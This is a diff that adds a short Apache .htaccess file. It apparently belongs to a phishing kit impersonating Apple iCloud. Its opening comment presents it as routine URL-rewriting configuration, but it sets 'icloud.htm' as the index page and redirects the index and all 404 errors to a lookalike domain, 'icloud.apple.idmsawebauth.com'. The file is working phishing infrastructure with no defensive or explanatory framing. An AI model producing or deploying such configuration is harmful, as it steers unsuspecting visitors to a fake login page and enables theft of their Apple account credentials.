@@ -1,0 +1,10 @@
+# Do not remove this line or mod_rewrite rules and search engine friendly URLs will stop working
+
+DirectoryIndex / icloud.htm
+
+
+
+RewriteEngine on
+RewriteBase /
+DirectoryIndex http://icloud.apple.idmsawebauth.com/
+ErrorDocument 404 http://icloud.apple.idmsawebauth.com
